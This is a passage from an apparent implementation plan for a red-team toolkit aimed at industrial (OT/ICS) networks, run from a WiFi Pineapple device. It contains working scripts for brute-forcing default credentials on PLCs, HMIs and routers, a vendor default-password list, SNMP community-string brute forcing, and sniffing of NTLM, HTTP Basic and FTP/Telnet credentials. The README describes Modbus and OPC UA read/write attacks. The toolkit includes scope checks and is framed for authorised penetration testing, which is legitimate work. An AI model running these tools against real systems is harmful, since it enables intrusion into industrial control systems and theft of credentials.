        print('[+] All endpoints require security')
        
except Exception as e:
    print(f'Error: {e}')
" 2>&1
  } | tee "$outfile"
  
  LOG green "Results: $outfile"
}
```

**Step 2: Verify syntax**

Run: `bash -n library/user/general/red-team-toolkit/scripts/modules/ot-protocols/opcua.sh`
Expected: No output (success)

**Step 3: Lint**

Run: `shellcheck library/user/general/red-team-toolkit/scripts/modules/ot-protocols/opcua.sh`
Expected: No errors

**Step 4: Commit**

```bash
git add library/user/general/red-team-toolkit/scripts/modules/ot-protocols/opcua.sh
git commit -m "feat: add OPC UA module with browse, read, write, security check"
```

---

## Phase 4: Credential Modules

### Task 4.1: Create Default Credentials Module

**Files:**
- Create: `library/user/general/red-team-toolkit/scripts/modules/credentials/default_creds.sh`
- Create: `library/user/general/red-team-toolkit/wordlists/ot-defaults.csv`

**Step 1: Write ot-defaults.csv**

```csv
vendor,product,protocol,port,username,password
Siemens,S7-1200,HTTP,80,admin,admin
Siemens,S7-1200,HTTP,80,admin,
Siemens,S7-1500,HTTP,80,admin,admin
Siemens,WinCC,HTTP,80,administrator,
Siemens,TIA Portal,HTTP,80,admin,admin
Rockwell,ControlLogix,HTTP,80,admin,1234
Rockwell,CompactLogix,HTTP,80,admin,admin
Rockwell,PanelView,VNC,5900,admin,1234
Rockwell,PanelView,VNC,5900,,1234
Schneider,M340,FTP,21,USER,USER
Schneider,M340,Telnet,23,USER,USER
Schneider,M580,HTTP,80,USER,USER
Schneider,Vijeo,HTTP,80,USER,USER
Schneider,Unity,HTTP,80,administrator,
ABB,AC500,HTTP,80,admin,admin
ABB,Freelance,HTTP,80,admin,admin
ABB,800xA,HTTP,80,administrator,administrator
Honeywell,Experion,HTTP,80,administrator,
Honeywell,Experion,HTTP,80,admin,admin
Honeywell,C300,HTTP,80,admin,admin
Emerson,DeltaV,HTTP,80,admin,admin
Emerson,Ovation,HTTP,80,ovation,ovation
GE,Cimplicity,HTTP,80,administrator,
GE,iFIX,HTTP,80,administrator,
GE,Mark VIe,HTTP,80,admin,admin
Yokogawa,Centum,HTTP,80,admin,admin
Yokogawa,ProSafe,HTTP,80,admin,admin
Generic,HMI,VNC,5900,admin,admin
Generic,HMI,VNC,5900,,
Generic,Router,HTTP,80,admin,admin
Generic,Router,HTTP,80,admin,password
Generic,Router,Telnet,23,admin,admin
Generic,Switch,HTTP,80,admin,admin
Generic,Switch,Telnet,23,admin,admin
Generic,Camera,HTTP,80,admin,admin
Generic,Camera,HTTP,80,admin,12345
Generic,SCADA,HTTP,80,admin,admin
Generic,Historian,HTTP,80,admin,admin
```

**Step 2: Write default_creds.sh**

```bash
#!/bin/bash
# Default credential checker for OT/IT devices

rt_default_creds() {
  local choice
  choice=$(menu_pick "Default Credentials" \
    "Check Single Target" \
    "Check Target List" \
    "Check by Vendor" \
    "View Wordlist")
  
  case "$choice" in
    1) creds_single ;;
    2) creds_list ;;
    3) creds_vendor ;;
    4) creds_view_wordlist ;;
    0|"") return ;;
  esac
}

creds_single() {
  local target
  target=$(IP_PICKER "Target IP" "${TARGET_NETWORK%%/*}")
  case $? in "$DUCKYSCRIPT_CANCELLED"|"$DUCKYSCRIPT_REJECTED"|"$DUCKYSCRIPT_ERROR") return ;; esac
  
  if ! in_scope "$target"; then
    LOG red "Target $target not in scope"
    return 1
  fi
  
  if ! check_passive; then return 1; fi
  
  local outfile="$ARTIFACT_DIR/creds_${target}_$(ts).txt"
  ensure_dir "$ARTIFACT_DIR"
  
  LOG blue "Checking default credentials on $target..."
  
  {
    echo "=== Default Credential Check: $target ==="
    echo "Timestamp: $(date)"
    echo ""
    
    # Detect open ports first
    local http_port="" ssh_port="" telnet_port="" vnc_port="" ftp_port=""
    
    port_open "$target" 80 2 && http_port=80
    port_open "$target" 443 2 && http_port=443
    port_open "$target" 8080 2 && http_port=8080
    port_open "$target" 22 2 && ssh_port=22
    port_open "$target" 23 2 && telnet_port=23
    port_open "$target" 5900 2 && vnc_port=5900
    port_open "$target" 21 2 && ftp_port=21
    
    LOG "Detected ports: HTTP=$http_port SSH=$ssh_port Telnet=$telnet_port VNC=$vnc_port FTP=$ftp_port"
    
    # Try HTTP basic auth
    if [[ -n "$http_port" ]]; then
      echo ""
      echo "=== HTTP Basic Auth ($http_port) ==="
      local proto="http"
      [[ "$http_port" == "443" ]] && proto="https"
      
      while IFS=, read -r vendor product protocol port user pass; do
        [[ "$protocol" != "HTTP" ]] && continue
        [[ "$user" == "username" ]] && continue  # Skip header
        
        local code
        code=$(curl -s -o /dev/null -w "%{http_code}" -u "$user:$pass" \
          --connect-timeout 3 -k "$proto://$target:$http_port/" 2>/dev/null)
        
        if [[ "$code" == "200" || "$code" == "301" || "$code" == "302" ]]; then
          echo "[+] SUCCESS: $user:$pass (HTTP $code) - $vendor $product"
        fi
      done < "$TOOLKIT_DIR/wordlists/ot-defaults.csv"
    fi
    
    # Try FTP
    if [[ -n "$ftp_port" ]]; then
      echo ""
      echo "=== FTP ($ftp_port) ==="
      
      while IFS=, read -r vendor product protocol port user pass; do
        [[ "$protocol" != "FTP" ]] && continue
        [[ "$user" == "username" ]] && continue
        
        if have curl; then
          if curl -s --connect-timeout 3 "ftp://$user:$pass@$target/" >/dev/null 2>&1; then
            echo "[+] SUCCESS: $user:$pass - $vendor $product"
          fi
        fi
      done < "$TOOLKIT_DIR/wordlists/ot-defaults.csv"
    fi
    
    # Try Telnet (basic check)
    if [[ -n "$telnet_port" ]] && have nc; then
      echo ""
      echo "=== Telnet ($telnet_port) ==="
      echo "Note: Manual verification recommended"
      
      # Just check if banner contains login prompt
      local banner
      banner=$(echo "" | nc -w 3 "$target" "$telnet_port" 2>/dev/null | head -3)
      echo "Banner: $banner"
    fi
    
  } | tee "$outfile"
  
  LOG green "Results: $outfile"
}

creds_list() {
  LOG "Enter targets (one per line, empty to finish):"
  
  local targets=()
  while true; do
    local t
    t=$(TEXT_PICKER "Target (empty=done)" "")
    case $? in "$DUCKYSCRIPT_CANCELLED"|"$DUCKYSCRIPT_REJECTED"|"$DUCKYSCRIPT_ERROR") break ;; esac
    [[ -z "$t" ]] && break
    targets+=("$t")
  done
  
  if [[ ${#targets[@]} -eq 0 ]]; then
    LOG "No targets entered"
    return
  fi
  
  LOG blue "Checking ${#targets[@]} targets..."
  
  for target in "${targets[@]}"; do
    LOG "--- $target ---"
    creds_check_target "$target"
  done
}

creds_check_target() {
  local target="$1"
  
  # Quick check - just HTTP for speed
  for port in 80 443 8080; do
    if port_open "$target" "$port" 2; then
      local proto="http"
      [[ "$port" == "443" ]] && proto="https"
      
      for cred in "admin:admin" "admin:" "administrator:" "admin:1234"; do
        local user="${cred%%:*}"
        local pass="${cred#*:}"
        
        local code
        code=$(curl -s -o /dev/null -w "%{http_code}" -u "$user:$pass" \
          --connect-timeout 2 -k "$proto://$target:$port/" 2>/dev/null)
        
        if [[ "$code" == "200" || "$code" == "301" || "$code" == "302" ]]; then
          LOG green "[+] $target:$port - $user:$pass works!"
          return 0
        fi
      done
    fi
  done
  
  LOG "$target - no default creds found"
}

creds_vendor() {
  local choice
  choice=$(menu_pick "Select Vendor" \
    "Siemens" \
    "Rockwell" \
    "Schneider" \
    "ABB" \
    "Honeywell" \
    "GE" \
    "Generic")
  
  local vendor
  case "$choice" in
    1) vendor="Siemens" ;;
    2) vendor="Rockwell" ;;
    3) vendor="Schneider" ;;
    4) vendor="ABB" ;;
    5) vendor="Honeywell" ;;
    6) vendor="GE" ;;
    7) vendor="Generic" ;;
    0|"") return ;;
  esac
  
  LOG blue "Default credentials for $vendor:"
  echo ""
  grep -i "^$vendor" "$TOOLKIT_DIR/wordlists/ot-defaults.csv" | \
    awk -F, '{printf "%-15s %-10s %s:%s\n", $2, $3, $5, $6}'
}

creds_view_wordlist() {
  LOG blue "=== OT Default Credentials Wordlist ==="
  head -50 "$TOOLKIT_DIR/wordlists/ot-defaults.csv"
  LOG ""
  LOG "Total entries: $(wc -l < "$TOOLKIT_DIR/wordlists/ot-defaults.csv")"
}
```

**Step 3: Verify syntax**

Run: `bash -n library/user/general/red-team-toolkit/scripts/modules/credentials/default_creds.sh`
Expected: No output (success)

**Step 4: Lint**

Run: `shellcheck library/user/general/red-team-toolkit/scripts/modules/credentials/default_creds.sh`
Expected: No errors

**Step 5: Commit**

```bash
git add library/user/general/red-team-toolkit/scripts/modules/credentials/default_creds.sh
git add library/user/general/red-team-toolkit/wordlists/ot-defaults.csv
git commit -m "feat: add default credentials module with OT vendor wordlist"
```

---

### Task 4.2: Create SNMP Enumeration Module

**Files:**
- Create: `library/user/general/red-team-toolkit/scripts/modules/credentials/snmp_enum.sh`
- Create: `library/user/general/red-team-toolkit/wordlists/snmp-communities.txt`

**Step 1: Write snmp-communities.txt**

```
public
private
community
SNMP
snmpd
snmp
admin
default
read
write
monitor
manager
netman
cable
internal
pass
password
tivoli
openview
secret
cisco
router
switch
system
ilmi
```

**Step 2: Write snmp_enum.sh**

```bash
#!/bin/bash
# SNMP enumeration and community string brute force

rt_snmp_enum() {
  local target
  target=$(IP_PICKER "SNMP target" "${TARGET_NETWORK%%/*}")
  case $? in "$DUCKYSCRIPT_CANCELLED"|"$DUCKYSCRIPT_REJECTED"|"$DUCKYSCRIPT_ERROR") return ;; esac
  
  if ! in_scope "$target"; then
    LOG red "Target $target not in scope"
    return 1
  fi
  
  local choice
  choice=$(menu_pick "SNMP: $target" \
    "Community String Brute Force" \
    "SNMP Walk (with known community)" \
    "System Info (sysDescr, sysName)")
  
  case "$choice" in
    1) snmp_brute "$target" ;;
    2) snmp_walk "$target" ;;
    3) snmp_sysinfo "$target" ;;
    0|"") return ;;
  esac
}

snmp_brute() {
  local target="$1"
  local outfile="$ARTIFACT_DIR/snmp_brute_${target}_$(ts).txt"
  ensure_dir "$ARTIFACT_DIR"
  
  if ! check_passive; then return 1; fi
  
  LOG blue "SNMP community string brute force: $target"
  
  {
    echo "=== SNMP Brute Force: $target ==="
    echo "Timestamp: $(date)"
    echo ""
    
    local wordlist="$TOOLKIT_DIR/wordlists/snmp-communities.txt"
    
    if have onesixtyone && [[ "$LAPTOP_ENABLED" -eq 1 ]]; then
      LOG "Using onesixtyone..."
      laptop_exec "onesixtyone -c /dev/stdin $target" < "$wordlist"
    elif have snmpwalk; then
      LOG "Using snmpwalk..."
      while read -r community; do
        [[ -z "$community" || "$community" == \#* ]] && continue
        
        local result
        result=$(snmpwalk -v2c -c "$community" "$target" sysDescr.0 2>&1)
        
        if [[ "$result" != *"Timeout"* && "$result" != *"Unknown"* ]]; then
          echo "[+] VALID: $community"
          echo "    $result"
        fi
      done < "$wordlist"
    elif have snmpget; then
      LOG "Using snmpget..."
      while read -r community; do
        [[ -z "$community" || "$community" == \#* ]] && continue
        
        if snmpget -v2c -c "$community" "$target" sysDescr.0 2>/dev/null | grep -q "STRING"; then
          echo "[+] VALID: $community"
        fi
      done < "$wordlist"
    else
      LOG red "Need snmpwalk, snmpget, or onesixtyone"
      return 1
    fi
    
  } | tee "$outfile"
  
  LOG green "Results: $outfile"
}

snmp_walk() {
  local target="$1"
  
  local community
  community=$(TEXT_PICKER "Community string" "public")
  case $? in "$DUCKYSCRIPT_CANCELLED"|"$DUCKYSCRIPT_REJECTED"|"$DUCKYSCRIPT_ERROR") return ;; esac
  
  local outfile="$ARTIFACT_DIR/snmp_walk_${target}_$(ts).txt"
  ensure_dir "$ARTIFACT_DIR"
  
  LOG blue "SNMP walk: $target (community: $community)"
  
  if have snmpwalk; then
    with_spinner "SNMP walk" bash -c "snmpwalk -v2c -c '$community' '$target' | head -200 | tee '$outfile'"
  elif [[ "$LAPTOP_ENABLED" -eq 1 ]]; then
    laptop_exec "snmpwalk -v2c -c '$community' '$target'" | head -200 | tee "$outfile"
  else
    LOG red "snmpwalk not available"
    return 1
  fi
  
  LOG green "Results: $outfile"
}

snmp_sysinfo() {
  local target="$1"
  
  local community
  community=$(TEXT_PICKER "Community string" "public")
  case $? in "$DUCKYSCRIPT_CANCELLED"|"$DUCKYSCRIPT_REJECTED"|"$DUCKYSCRIPT_ERROR") return ;; esac
  
  LOG blue "SNMP system info: $target"
  
  local oids=(
    "sysDescr.0"
    "sysObjectID.0"
    "sysName.0"
    "sysLocation.0"
    "sysContact.0"
    "sysUpTime.0"
  )
  
  for oid in "${oids[@]}"; do
    local result
    if have snmpget; then
      result=$(snmpget -v2c -c "$community" "$target" "$oid" 2>/dev/null)
    elif have snmpwalk; then
      result=$(snmpwalk -v2c -c "$community" "$target" "$oid" 2>/dev/null)
    fi
    
    if [[ -n "$result" && "$result" != *"Timeout"* ]]; then
      LOG "$oid: $result"
    fi
  done
}
```

**Step 3: Verify syntax**

Run: `bash -n library/user/general/red-team-toolkit/scripts/modules/credentials/snmp_enum.sh`
Expected: No output (success)

**Step 4: Lint**

Run: `shellcheck library/user/general/red-team-toolkit/scripts/modules/credentials/snmp_enum.sh`
Expected: No errors

**Step 5: Commit**

```bash
git add library/user/general/red-team-toolkit/scripts/modules/credentials/snmp_enum.sh
git add library/user/general/red-team-toolkit/wordlists/snmp-communities.txt
git commit -m "feat: add SNMP enumeration module with community string wordlist"
```

---

### Task 4.3: Create Hash Capture Module

**Files:**
- Create: `library/user/general/red-team-toolkit/scripts/modules/credentials/hash_capture.sh`

**Step 1: Write hash_capture.sh**

```bash
#!/bin/bash
# Passive hash/credential capture from network traffic

rt_hash_capture() {
  local choice
  choice=$(menu_pick "Hash Capture" \
    "Passive NTLM Capture (tcpdump)" \
    "Responder Analyze Mode (laptop)" \
    "Capture HTTP Basic Auth" \
    "Capture FTP/Telnet Creds")
  
  case "$choice" in
    1) hash_ntlm_passive ;;
    2) hash_responder_analyze ;;
    3) hash_http_basic ;;
    4) hash_plaintext ;;
    0|"") return ;;
  esac
}

hash_ntlm_passive() {
  local duration
  duration=$(NUMBER_PICKER "Capture duration (seconds)" 120)
  case $? in "$DUCKYSCRIPT_CANCELLED"|"$DUCKYSCRIPT_REJECTED"|"$DUCKYSCRIPT_ERROR") return ;; esac
  
  local iface
  iface=$(TEXT_PICKER "Interface" "eth0")
  case $? in "$DUCKYSCRIPT_CANCELLED"|"$DUCKYSCRIPT_REJECTED"|"$DUCKYSCRIPT_ERROR") return ;; esac
  
  local outfile="$ARTIFACT_DIR/ntlm_capture_$(ts).pcap"
  ensure_dir "$ARTIFACT_DIR"
  
  LOG blue "Passive NTLM capture on $iface for $duration seconds..."
  LOG "Capturing SMB (445), HTTP (80,8080), LDAP (389) traffic"
  
  if have tcpdump; then
    with_spinner "Capturing" run_timeboxed "$duration" \
      tcpdump -i "$iface" -w "$outfile" \
      'port 445 or port 139 or port 80 or port 8080 or port 389' \
      2>/dev/null
    
    LOG green "Capture saved: $outfile"
    LOG "Extract hashes with: python3 PCredz.py -f $outfile"
    LOG "Or use: responder-RunFinger -f $outfile"
  else
    LOG red "tcpdump required"
    return 1
  fi
}

hash_responder_analyze() {
  if [[ "$LAPTOP_ENABLED" -ne 1 ]]; then
    LOG red "Requires laptop mode"
    return 1
  fi
  
  local iface
  iface=$(TEXT_PICKER "Laptop interface" "eth0")
  case $? in "$DUCKYSCRIPT_CANCELLED"|"$DUCKYSCRIPT_REJECTED"|"$DUCKYSCRIPT_ERROR") return ;; esac
  
  LOG blue "Starting Responder in Analyze mode (passive)..."
  LOG "This will NOT poison, only capture"
  
  # Responder -A is analyze only (no poisoning)
  laptop_exec_bg "responder -I '$iface' -A" "$LAPTOP_RESULTS_DIR/responder_analyze.log"
  
  LOG green "Responder started in background (analyze mode)"
  LOG "Hashes will be saved to laptop: /usr/share/responder/logs/"
  LOG "Fetch with: Laptop Tools > Fetch Results"
}

hash_http_basic() {
  local duration
  duration=$(NUMBER_PICKER "Capture duration (seconds)" 120)
  case $? in "$DUCKYSCRIPT_CANCELLED"|"$DUCKYSCRIPT_REJECTED"|"$DUCKYSCRIPT_ERROR") return ;; esac
  
  local iface
  iface=$(TEXT_PICKER "Interface" "eth0")
  case $? in "$DUCKYSCRIPT_CANCELLED"|"$DUCKYSCRIPT_REJECTED"|"$DUCKYSCRIPT_ERROR") return ;; esac
  
  local outfile="$ARTIFACT_DIR/http_auth_$(ts).txt"
  ensure_dir "$ARTIFACT_DIR"
  
  LOG blue "Capturing HTTP Basic Auth headers..."
  
  if have tcpdump; then
    {
      echo "=== HTTP Basic Auth Capture ==="
      echo "Start: $(date)"
      echo ""
      
      run_timeboxed "$duration" \
        tcpdump -i "$iface" -A -s 0 'port 80 or port 8080' 2>/dev/null | \
        grep -i "Authorization: Basic" | while read -r line; do
          echo "$line"
          # Decode Base64
          local b64
          b64=$(echo "$line" | awk '{print $NF}')
          local decoded
          decoded=$(echo "$b64" | base64 -d 2>/dev/null)
          echo "  Decoded: $decoded"
        done
        
    } | tee "$outfile"
    
    LOG green "Results: $outfile"
  else
    LOG red "tcpdump required"
  fi
}

hash_plaintext() {
  local duration
  duration=$(NUMBER_PICKER "Capture duration (seconds)" 120)
  case $? in "$DUCKYSCRIPT_CANCELLED"|"$DUCKYSCRIPT_REJECTED"|"$DUCKYSCRIPT_ERROR") return ;; esac
  
  local iface
  iface=$(TEXT_PICKER "Interface" "eth0")
  case $? in "$DUCKYSCRIPT_CANCELLED"|"$DUCKYSCRIPT_REJECTED"|"$DUCKYSCRIPT_ERROR") return ;; esac
  
  local outfile="$ARTIFACT_DIR/plaintext_creds_$(ts).txt"
  ensure_dir "$ARTIFACT_DIR"
  
  LOG blue "Capturing plaintext credentials (FTP, Telnet)..."
  
  if have tcpdump; then
    {
      echo "=== Plaintext Credential Capture ==="
      echo "Start: $(date)"
      echo ""
      
      run_timeboxed "$duration" \
        tcpdump -i "$iface" -A -s 0 'port 21 or port 23 or port 110 or port 143' 2>/dev/null | \
        grep -iE '(USER|PASS|LOGIN|user|pass)' | head -100
        
    } | tee "$outfile"
    
    LOG green "Results: $outfile"
  else
    LOG red "tcpdump required"
  fi
}
```

**Step 2: Verify syntax**

Run: `bash -n library/user/general/red-team-toolkit/scripts/modules/credentials/hash_capture.sh`
Expected: No output (success)

**Step 3: Lint**

Run: `shellcheck library/user/general/red-team-toolkit/scripts/modules/credentials/hash_capture.sh`
Expected: No errors

**Step 4: Commit**

```bash
git add library/user/general/red-team-toolkit/scripts/modules/credentials/hash_capture.sh
git commit -m "feat: add passive hash and credential capture module"
```

---

## Phase 5: Final Integration

### Task 5.1: Remove Old Module Files and Clean Up

**Step 1: Move legacy modules to new locations**

```bash
cd library/user/general/red-team-toolkit/scripts/modules

# Move existing OT modules that are being replaced
mv modbus_scan.sh modbus_scan.sh.bak 2>/dev/null || true
mv enip_scan.sh enip_scan.sh.bak 2>/dev/null || true
mv opcua_scan.sh opcua_scan.sh.bak 2>/dev/null || true

# Keep wireless/physical modules as-is (they work)
```

**Step 2: Remove .gitkeep files where real files exist**

```bash
rm -f scripts/modules/discovery/.gitkeep
rm -f scripts/modules/ot-protocols/.gitkeep
rm -f scripts/modules/credentials/.gitkeep
rm -f scripts/modules/laptop/.gitkeep
rm -f wordlists/.gitkeep
```

**Step 3: Commit cleanup**

```bash
git add -A
git commit -m "chore: clean up legacy module files and placeholder gitkeeps"
```

---

### Task 5.2: Update README

**Files:**
- Modify: `library/user/general/red-team-toolkit/README.md`

**Step 1: Write updated README**

```markdown
# Red Team Toolkit v2.0

Swiss-army-knife payload for IT/OT penetration testing engagements on the WiFi Pineapple Pager.

## Features

### Discovery & Mapping
- ARP scan, ping sweep, port scan
- Service identification and banner grabbing
- OT device fingerprinting (MAC OUI, port-based classification)
- Passive broadcast listening (mDNS, LLDP, Profinet DCP)
- Asset inventory aggregation

### OT Protocol Attacks
- **Modbus/TCP**: Device ID, read/write coils and registers
- **EtherNet/IP (CIP)**: Identity, tag enumeration, read/write
- **OPC UA**: Browse, read, write, security audit
- *(More protocols in development: DNP3, PROFINET, BACnet, S7comm)*

### Credential Harvesting
- Default credential checker (50+ OT vendor defaults)
- SNMP community string enumeration
- Passive hash capture (NTLM, HTTP Basic)
- Responder integration (laptop mode)

### Wireless & Physical
- WiFi passive recon, handshake capture
- RS485 serial monitoring
- CAN bus monitoring
- RTL-SDR

## Operating Modes

| Mode | Description |
|------|-------------|
| **Standalone** | Pager runs lightweight tools directly |
| **Laptop-assisted** | Heavy tools via SSH to connected laptop |
| **Hybrid** | Auto-fallback: local tools first, then laptop |

## Quick Start

1. Copy this folder to your Pager
2. Edit `scripts/config.sh` with engagement details
3. Launch from Pager UI
4. Select module from main menu

## Configuration

Edit `scripts/config.sh`:

```bash
# Engagement
ENGAGEMENT_NAME="client-2025"
TARGET_NETWORK="192.168.1.0/24"
EXCLUDE_IPS="192.168.1.1"

# Safety
SAFE_MODE=1              # Confirm before destructive actions
PASSIVE_ONLY=0           # Set to 1 to block all active attacks

# Laptop Integration
LAPTOP_ENABLED=0         # Set to 1 to enable
LAPTOP_HOST="user@10.0.0.50"
LAPTOP_KEY="/root/.ssh/id_rsa"
```

## Directory Structure

```
red-team-toolkit/
├── payload.sh              # Main entry point
├── scripts/
│   ├── config.sh           # Engagement configuration
│   ├── common.sh           # Shared helpers
│   ├── menu.sh             # Menu system
│   └── modules/
│       ├── discovery/      # Network scanning
│       ├── ot-protocols/   # ICS protocol attacks
│       ├── credentials/    # Credential harvesting
│       ├── wireless/       # WiFi attacks
│       ├── physical/       # Serial, CAN, SDR
│       └── laptop/         # SSH wrappers
├── wordlists/
│   ├── ot-defaults.csv     # Vendor default creds
│   ├── snmp-communities.txt
│   └── ics-oui.txt         # MAC vendor lookup
└── artifacts/              # Scan outputs
```

## Laptop Setup (Optional)

For full capability, set up a laptop with:

```bash
# Install tools
apt install nmap responder impacket-scripts snmp

# Python libraries
pip3 install pycomm3 opcua

# SSH key exchange
ssh-copy-id user@pager-ip
```

## Safety Features

- **SAFE_MODE**: Requires confirmation before writes, poisoning, etc.
- **PASSIVE_ONLY**: Blocks all active attacks when enabled
- **Scope controls**: TARGET_NETWORK and EXCLUDE_IPS enforce boundaries
- **Timeboxing**: Long scans auto-terminate

## Artifacts

All outputs saved to `artifacts/<engagement_name>/`:
- `arp_scan_*.txt` - ARP scan results
- `fingerprint_*.txt` - OT device profiles
- `inventory.txt` - Aggregated asset inventory
- `modbus_*.txt` - Modbus interaction logs
- `creds_*.txt` - Credential check results
- `*.pcap` - Packet captures

## Requirements

### Standalone (basic functionality)
- tcpdump, netcat, curl (usually pre-installed)

### Full functionality
- nmap, arp-scan, fping
- snmpwalk, mbpoll
- python3 with opcua library

### Laptop-assisted
- SSH access to laptop with pentest tools
- Responder, Impacket, Nmap, pycomm3
```

**Step 2: Verify no syntax errors in shell examples**

(N/A - README is markdown)

**Step 3: Commit**

```bash
git add library/user/general/red-team-toolkit/README.md
git commit -m "docs: update README for v2.0 with full feature documentation"
```

---

## Summary

**Total Tasks:** 17 tasks across 5 phases

**Files Created:**
- `scripts/config.sh` - Engagement configuration
- `scripts/menu.sh` - Menu helpers
- `scripts/modules/laptop/ssh_exec.sh` - SSH wrapper
- `scripts/modules/discovery/net_scan.sh` - Network scanning
- `scripts/modules/discovery/service_id.sh` - Service identification
- `scripts/modules/discovery/ot_fingerprint.sh` - OT device fingerprinting
- `scripts/modules/discovery/asset_inventory.sh` - Asset aggregation
- `scripts/modules/ot-protocols/modbus.sh` - Modbus R/W
- `scripts/modules/ot-protocols/enip_cip.sh` - EtherNet/IP
- `scripts/modules/ot-protocols/opcua.sh` - OPC UA
- `scripts/modules/credentials/default_creds.sh` - Default creds
- `scripts/modules/credentials/snmp_enum.sh` - SNMP enumeration
- `scripts/modules/credentials/hash_capture.sh` - Hash capture
- `wordlists/ot-defaults.csv` - OT default credentials
- `wordlists/snmp-communities.txt` - SNMP wordlist
- `wordlists/ics-oui.txt` - ICS vendor MACs

**Files Modified:**
- `payload.sh` - Complete refactor with v2 menu system
- `scripts/common.sh` - Additional helpers
- `README.md` - Full documentation

**Estimated Time:** 8-12 hours of focused implementation
